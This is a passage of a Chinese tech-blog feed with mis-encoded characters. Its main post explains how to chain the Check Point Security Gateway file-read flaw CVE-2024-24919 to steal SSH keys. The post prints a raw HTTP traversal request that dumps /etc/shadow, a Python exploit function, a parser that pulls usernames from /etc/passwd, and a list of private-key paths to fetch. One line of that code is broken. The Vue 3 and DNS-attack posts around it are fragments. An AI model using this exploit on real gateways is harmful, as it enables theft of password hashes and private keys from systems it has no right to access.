<li>é€‰é¡¹å¼ API æ˜¯ â€œé¢å‘é€‰é¡¹â€ çš„æ€ç»´ï¼Œé€‚åˆå…¥é—¨å’Œç®€å•åœºæ™¯ï¼Œç¬¦åˆä¼ ç»Ÿå‰ç«¯çš„ä»£ç ç»„ç»‡ä¹ æƒ¯ï¼›</li>
<li>ç»„åˆå¼ API æ˜¯ â€œé¢å‘é€»è¾‘â€ çš„æ€ç»´ï¼Œè§£å†³äº†é€‰é¡¹å¼ API åœ¨å¤æ‚åœºæ™¯ä¸‹çš„å¤ç”¨ã€ç»´æŠ¤ç—›ç‚¹ï¼Œæ˜¯ Vue 3 çš„æ ¸å¿ƒå‡çº§ï¼Œä¹Ÿæ˜¯å¤§å‹é¡¹ç›®çš„æœ€ä½³å®è·µã€‚</li>
</ul>
<p>ä¸¤è€…å¹¶éäº’æ–¥ï¼ŒVue 3 å®Œå…¨å…¼å®¹é€‰é¡¹å¼ APIï¼Œå¯æ ¹æ®é¡¹ç›®è§„æ¨¡å’Œå›¢é˜Ÿä¹ æƒ¯çµæ´»é€‰æ‹©ï¼ˆç”šè‡³åŒä¸€é¡¹ç›®ä¸­æ··åˆä½¿ç”¨ï¼‰ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é“¾å¼åˆ©ç”¨CVE-2024â€“24919ï¼šé€šè¿‡Checkpointå®‰å…¨ç½‘å…³LFIæ¼æ´æŒ–æ˜æ•æ„ŸSSHå¯†é’¥]]></title>    <link>https://juejin.cn/post/7590054976489537576</link>    <guid>https://juejin.cn/post/7590054976489537576</guid>    <pubDate>2026-01-02T09:44:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590054976489537576" data-draft-id="7590071125398388776" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é“¾å¼åˆ©ç”¨CVE-2024â€“24919ï¼šé€šè¿‡Checkpointå®‰å…¨ç½‘å…³LFIæ¼æ´æŒ–æ˜æ•æ„ŸSSHå¯†é’¥"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-02T09:44:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="qife122"/> <meta itemprop="url" content="https://juejin.cn/user/1743174852185579"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é“¾å¼åˆ©ç”¨CVE-2024â€“24919ï¼šé€šè¿‡Checkpointå®‰å…¨ç½‘å…³LFIæ¼æ´æŒ–æ˜æ•æ„ŸSSHå¯†é’¥
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1743174852185579/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    qife122
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T09:44:07.000Z" title="Fri Jan 02 2026 09:44:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">é“¾å¼åˆ©ç”¨CVE-2024â€“24919ï¼šé€šè¿‡Checkpointå®‰å…¨ç½‘å…³LFIæ¼æ´è·å–æ›´æ•æ„Ÿçš„å‘ç°</h2>
<p>2024å¹´4æœˆ28æ—¥ï¼ŒNVDå‘å¸ƒäº†ä¸€ä¸ªå…³äºCheck Pointå®‰å…¨ç½‘å…³LFIï¼ˆæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼‰çš„CVEã€‚æ›´æ·±å…¥çš„ç»†èŠ‚å¯ä»¥åœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Flabs.watchtowr.com%2Fcheck-point-wrong-check-point-cve-2024-24919%2F" target="_blank" title="https://labs.watchtowr.com/check-point-wrong-check-point-cve-2024-24919/" ref="nofollow noopener noreferrer">labs.watchtowr.com/check-pointâ€¦</a> æ‰¾åˆ°ï¼Œè¿™æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªæ•æ„Ÿä¿¡æ¯æ³„éœ²æ¼æ´ã€‚æ”»å‡»è€…ä¸ä»…èƒ½å¤Ÿæ³„éœ²æ™®é€šçš„æ•æ„Ÿä¿¡æ¯ï¼Œç”šè‡³å¯ä»¥ç›´æ¥è½¬å‚¨<code>/etc/shadow</code>æ–‡ä»¶ï¼Œè¿™æ˜¯éå¸¸ä¸¥é‡çš„æƒ…å†µï¼Œå› ä¸ºshadowæ–‡ä»¶åŒ…å«äº†æœºå™¨ç”¨æˆ·å‡­è¯çš„å“ˆå¸Œå€¼ã€‚æœ¬ç¯‡åšå®¢å¹¶éå…³äºç ´è§£shadowæ–‡ä»¶ï¼Œè€Œæ˜¯å…³äº <strong>â€œæˆ‘ä»¬å¦‚ä½•é“¾å¼åˆ©ç”¨è¿™äº›æ•æ„Ÿæ–‡ä»¶æ³„éœ²æ¥å‘ç°æ›´æ•æ„Ÿçš„æ–‡ä»¶ï¼Œä¾‹å¦‚SSHå¯†é’¥â€</strong>ã€‚</p>
<h3 data-id="heading-1">ç®€å•çš„POCï¼ˆæ¦‚å¿µéªŒè¯ï¼‰</h3>
<pre><code class="hljs language-http" lang="http">POST /clients/MyCRL HTTP/1.1
Host: 127.0.0.1
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i
Connection: close

aCSHELL/../../../../../../../../../../../etc/shadow
</code></pre>
<p>æœåŠ¡å™¨å°†æŠŠshadowæ–‡ä»¶ä½œä¸ºå“åº”è¿”å›ç»™ä½ ï¼Œè¿™éå¸¸å®¹æ˜“ã€‚åªéœ€é€šè¿‡POSTæ–¹æ³•å‘é€è·¯å¾„ï¼Œæˆ‘ä»¬å°±èƒ½è·å–shadowæ–‡ä»¶ã€‚å¦‚æœå¯†ç å¼ºåº¦å¾ˆé«˜ï¼Œç”¨Hashcatç ´è§£å¯èƒ½éœ€è¦å¾ˆé•¿æ—¶é—´ã€‚äºæ˜¯æˆ‘æƒ³ï¼Œâ€œå¦‚æœæˆ‘ä»¬æœ‰èƒ½åŠ›è¯»å–ä»»ä½•æ–‡ä»¶ï¼Œé‚£è®©æˆ‘ä»¬å»è¯»å–SSHçš„<code>id_rsa</code>å¯†é’¥å§ã€‚â€</p>
<p>ä½†è¿™å¾ˆå›°éš¾ã€‚æˆ‘æƒ³æ£€æŸ¥é‚£é‡Œå­˜åœ¨çš„æ¯ä¸ªç”¨æˆ·ï¼Œçœ‹çœ‹è¿™äº›ç”¨æˆ·çš„homeç›®å½•æ˜¯å¦åŒ…å«SSHå¯†é’¥ã€‚
<strong>è¦æ±‚ï¼š</strong></p>
<ol>
<li>ç”¨æˆ·å</li>
<li>è·¯å¾„</li>
<li>è‡ªåŠ¨åŒ–æ£€æŸ¥å™¨</li>
</ol>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬æ¥æ„å»ºæ£€æŸ¥å™¨ï¼Œå®ƒå°†åƒä¸Šé¢çš„åŸå§‹è¯·æ±‚POCä¸€æ ·å‘WebæœåŠ¡å™¨å‘é€è¯·æ±‚ã€‚ä¸Šé¢HTTPåŸå§‹è¯·æ±‚çš„Python3ç‰ˆæœ¬å¦‚ä¸‹ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>(<span class="hljs-params">ip, path</span>):
    target = <span class="hljs-string">f'https://<span class="hljs-subst">{ip}</span>/clients/MyCRL'</span>
    data = <span class="hljs-string">f'aCSHELL/../../../../../../../../../../..<span class="hljs-subst">{path}</span>'</span>
    headers = {
        <span class="hljs-string">'Host'</span>: ip,
        <span class="hljs-string">'User-Agent'</span>: <span class="hljs-string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0'</span>,
        <span class="hljs-string">'Te'</span>: <span class="hljs-string">'trailers'</span>,
        <span class="hljs-string">'Dnt'</span>: <span class="hljs-string">'1'</span>,
        <span class="hljs-string">'Connection'</span>: <span class="hljs-string">'keep-alive'</span>,
        <span class="hljs-string">'Content-Length'</span>: <span class="hljs-string">'48'</span>
    }
    <span class="hljs-keyword">try</span>:
        response = requests.post(target, headers=headers, data=data, verify=<span class="hljs-literal">False</span>, timeout=<span class="hljs-number">5</span>)
        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f'<span class="hljs-subst">{Fore.GREEN}</span>[+]<span class="hljs-subst">{Fore.WHITE}</span> Dumped <span class="hljs-subst">{Fore.GREEN}</span><span class="hljs-subst">{path}</span><span class="hljs-subst">{Fore.WHITE}</span> from <span class="hljs-subst">{Fore.GREEN}</span><span class="hljs-subst">{ip}</span><span class="hljs-subst">{Fore.WHITE}</span> successfully'</span>)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f'<span class="hljs-subst">{Fore.GREEN}</span>[+]<span class="hljs-subst">{Fore.WHITE}</span> Response: <span class="hljs-subst">{response.text}</span>'</span>)
            data = <span class="hljs-string">f"[+] Dumped <span class="hljs-subst">{path}</span> from <span class="hljs-subst">{ip}</span> successfully\n[+] Response: <span class="hljs-subst">{response.text}</span>\n"</span>
            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'dumped.txt'</span>, <span class="hljs-string">'a'</span>) <span class="hljs-keyword">as</span> file:
                file.write(data)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f'<span class="hljs-subst">{Fore.RED}</span>[-]<span class="hljs-subst">{Fore.WHITE}</span> Failed to dump <span class="hljs-subst">{Fore.RED}</span><span class="hljs-subst">{path}</span><span class="hljs-subst">{Fore.WHITE}</span> from <span class="hljs-subst">{Fore.RED}</span><span class="hljs-subst">{ip}</span><span class="hljs-subst">{Fore.WHITE}</span>'</span>)
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f'<span class="hljs-subst">{Fore.RED}</span>[-]<span class="hljs-subst">{Fore.WHITE}</span> Failed to dump <span class="hljs-subst">{Fore.RED}</span><span class="hljs-subst">{path}</span><span class="hljs-subst">{Fore.WHITE}</span> from <span class="hljs-subst">{Fore.RED}</span><span class="hljs-subst">{ip}</span><span class="hljs-subst">{Fore.WHITE}</span>: <span class="hljs-subst">{e}</span>'</span>)
</code></pre>
<p>ç°åœ¨æˆ‘ä»¬éœ€è¦ä»æœåŠ¡å™¨æå–ç”¨æˆ·åã€‚é€šå¸¸<code>/etc/passwd</code>æ–‡ä»¶åŒ…å«ç”¨æˆ·åˆ—è¡¨ã€‚</p>
<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-symbol">root:</span>!<span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/</span><span class="hljs-symbol">:/bin/false</span>
<span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">99</span><span class="hljs-symbol">:</span><span class="hljs-number">99</span><span class="hljs-symbol">:nobody</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/bin/false</span>
<span class="hljs-symbol">ntp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/bin/false</span>
<span class="hljs-symbol">rpm:</span><span class="hljs-symbol">x:</span><span class="hljs-number">37</span><span class="hljs-symbol">:</span><span class="hljs-number">37</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/bin/false</span>
<span class="hljs-symbol">pcap:</span><span class="hljs-symbol">x:</span><span class="hljs-number">77</span><span class="hljs-symbol">:</span><span class="hljs-number">77</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/bin/false</span>
<span class="hljs-symbol">ace:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:Linux</span> <span class="hljs-title class_">User</span>,,,<span class="hljs-symbol">:/</span><span class="hljs-symbol">:/bin/clish</span>
<span class="hljs-symbol">joker:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:Linux</span> <span class="hljs-title class_">User</span>,,,<span class="hljs-symbol">:/</span><span class="hljs-symbol">:/bin/clish</span>
<span class="hljs-symbol">sysBadmin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:Linux</span> <span class="hljs-title class_">User</span>,,,<span class="hljs-symbol">:/</span><span class="hljs-symbol">:/bin/clish</span>
<span class="hljs-title class_">Thema</span><span class="hljs-symbol">:x</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:Linux</span> <span class="hljs-title class_">User</span>,,,<span class="hljs-symbol">:/</span><span class="hljs-symbol">:/bin/clish</span>
</code></pre>
<p>æœ‰ä¸€äº›ä¸å­˜åœ¨çš„ç”¨æˆ·ï¼Œå¦‚<code>ntp</code>ã€<code>rpm</code>ã€<code>pcap</code>ï¼Œæˆ‘ä»¬ä¸éœ€è¦è¿™äº›ç”¨æˆ·ã€‚å› æ­¤ï¼Œè®©æˆ‘ä»¬ç¼–å†™ä¸€ä¸ªç®€å•çš„Python3è„šæœ¬æ¥å®ç°è¿™ä¸€ç‚¹ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">usernames</span>(<span class="hljs-params">passwd_content</span>):
    usernames = []
    lines = passwd_content.split(<span class="hljs-string">'\n'</span>)
    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:
        parts = line.split(<span class="hljs-string">':'</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(parts) &gt;= <span class="hljs-number">7</span>:
            username = parts[<span class="hljs-number">0</span>]
            shell = parts[-<span class="hljs-number">1</span>].strip()
            <span class="hljs-keyword">if</span> shell <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> [<span class="hljs-string">'/sbin/nologin'</span>, <span class="hljs-string">'/bin/false'</span>, <span class="hljs-string">'/usr/sbin/nologin'</span>, <span class="hljs-string">'/bin/sync'</span>]:
                usernames.append(username)
    <span class="hljs-keyword">return</span> usernames
</code></pre>
<p>æˆ‘é€šè¿‡ç§»é™¤é‚£äº›ä½¿ç”¨<code>/sbin/nologin</code>ã€<code>/bin/false</code> shellçš„ç”¨æˆ·ç®€åŒ–äº†è¿™ä¸ªä»»åŠ¡ã€‚ç°åœ¨æˆ‘ä»¬æœ‰äº†ç”¨æˆ·åˆ—è¡¨ï¼Œéœ€è¦ä¸ºè¿™äº›ç”¨æˆ·åˆ›å»ºRSAå¯†é’¥çš„è·¯å¾„åˆ—è¡¨ã€‚</p>
<pre><code class="hljs language-python" lang="python">username = usernames(passwd)
sshkeypathlists = []
<span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> username:
    sshkeypathlists.append(<span class="hljs-string">f'/home/<span class="hljs-subst">{user}</span>/.ssh/id_rsa'</span>)
    sshkeypathlists.append(<span class="hljs-string">f'/home/<span class="hljs-subst">{user}</span>/.ssh/id_dsa'</span>)
    sshkeypathlists.append(<span class="hljs-string">f'/home/<span class="hljs-subst">{user}</span>/.ssh/id_ecdsa'</span>)
    sshkeypathlists.append(<span class="hljs-string">f'/home/<span class="hljs-subst">{user}</span>/.ssh/id_ed25519'</span>)
    sshkeypathlists.end(<span class="hljs-string">f'/home/<span class="hljs-subst">{user}</span>/.ssh/config'</span>)
    sshkeypathlists.append(<span class="hljs-string">f'/home/<span class="hljs-subst">{user}</span>/.ssh/identity'</span>)
    sshkeypathlists.append(<span class="hljs-string">f'/home/<span class="hljs-subst">{user}</span>/.ssh/id_rsa.pub'</span>)
    sshkeypathlists.append(<span class="hljs-string">f'/home/<span class="hljs-subst">{user}</span>/.ssh/id_dsa.pub'</span>)
    sshkeypathlists.append(<span class="hljs-string">f'/home/<span class="hljs-subst">{user}</span>/.ssh/id_ecdsa.pub'</span>)
    sshkeypathlists.append(<span class="hljs-string">f'/home/<span class="hljs-subst">{user}</span>/.ssh/id_ed25519.pub'</span>)
    sshkeypathlists.append(<span class="hljs-string">f'/home/<span class="hljs-subst">{user}</span>/.ssh/authorized_keys.pub'</span>)
    sshkeypathlists.append(<span class="hljs-string">f'/home/<span class="hljs-subst">{user}</span>/.ssh/known_hosts.pub'</span>)
    sshkeypathlists.append(<span class="hljs-string">f'/home/<span class="hljs-subst">{user}</span>/.ssh/config.pub'</span>)
    sshkeypathlists.append(<span class="hljs-string">f'/home/<span class="hljs-subst">{user}</span>/.ssh/identity.pub'</span>)
    sshkeypathlists.append(<span class="hljs-string">f'/root/.ssh/id_rsa'</span>)
    sshkeypathlists.append(<span class="hljs-string">f'/root/.ssh/id_dsa'</span>)
    sshkeypathlists.append(<span class="hljs-string">f'/root/.ssh/id_ecdsa'</span>)
    sshkeypathlists.append(<span class="hljs-string">f'/root/.ssh/id_ed25519'</span>)
    sshkeypathlists.append(<span class="hljs-string">f'/home/<span class="hljs-subst">{user}</span>/.ssh/known_hosts'</span>)
</code></pre>
<p><code>id_rsa</code>å¯†é’¥çš„æ³„éœ²é€šè¿‡è¿™ç§æ–¹æ³•å¾—åˆ°äº†æ›´å¥½çš„æ¢³ç†ï¼Œå®ƒåªä¼šæ£€æŸ¥rootå’Œç°æœ‰ç”¨æˆ·çš„homeç›®å½•ä¸­çš„å¯†é’¥ã€‚ç°åœ¨ï¼Œè®©æˆ‘ä»¬æŠŠæ‰€æœ‰ä¸œè¥¿ç»“åˆèµ·æ¥ã€‚é¦–å…ˆæµ‹è¯•ä¸€ä¸‹è¿™äº›å‡½æ•°æ˜¯å¦å·¥ä½œå®Œç¾ã€‚</p>
<p>ç°åœ¨ï¼Œè®©æˆ‘ä»¬æŠŠå®ƒä»¬ç»„åˆèµ·æ¥ï¼Œå¹¶æ·»åŠ ä¸€äº›å¹¶å‘å¤„ç†ä»¥æé«˜é€Ÿåº¦ã€‚</p>
<p><strong>ä»…å°†æ­¤è„šæœ¬ç”¨äºæ•™è‚²ç›®çš„ï¼Œæˆ‘å¯¹æ‚¨çš„ä»»ä½•æ¶æ„è¡Œä¸ºæ¦‚ä¸è´Ÿè´£ã€‚</strong></p>
<p>æ„Ÿè°¢Ashrafulé€šçŸ¥æˆ‘è¿™ä¸ªCVEã€‚Ashrafulçš„Twitterï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2FmyselfAshraful" target="_blank" title="https://x.com/myselfAshraful" ref="nofollow noopener noreferrer">x.com/myselfAshraâ€¦</a>
CSD0tFqvECLokhw9aBeRqh4hzNr1jcA74GEiU+TM92Y2QfFPyT3PMy/YqFcTbwddRgmtw15BcOqFaRn6qsQZ5lKdz3ZbpXl8L0OXzLCPvKrd2MgSSiisveuodCE+F53+JkX0JqMgBwx21srCGhYSj4XobOwlr/3z1MWNHqNJcN3qptuAYGIH4ysv05HoGb+i</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[DNSå®‰å…¨å¨èƒï¼šä»åŠ«æŒã€æ±¡æŸ“åˆ°æ”¾å¤§æ”»å‡»çš„æ¼”ç»ƒ]]></title>    <link>https://juejin.cn/post/7589907831199203354</link>    <guid>https://juejin.cn/post/7589907831199203354</guid>    <pubDate>2026-01-01T10:29:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589907831199203354" data-draft-id="7589839019716542514" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="DNSå®‰å…¨å¨èƒï¼šä»åŠ«æŒã€æ±¡æŸ“åˆ°æ”¾å¤§æ”»å‡»çš„æ¼”ç»ƒ"/> <meta itemprop="keywords" content="å®‰å…¨,ç½‘ç»œåè®®"/> <meta itemprop="datePublished" content="2026-01-01T10:29:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="sweetä¸¶"/> <meta itemprop="url" content="https://juejin.cn/user/3227821869921646"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            DNSå®‰å…¨å¨èƒï¼šä»åŠ«æŒã€æ±¡æŸ“åˆ°æ”¾å¤§æ”»å‡»çš„æ¼”ç»ƒ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3227821869921646/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    sweetä¸¶
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T10:29:04.000Z" title="Thu Jan 01 2026 10:29:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    12
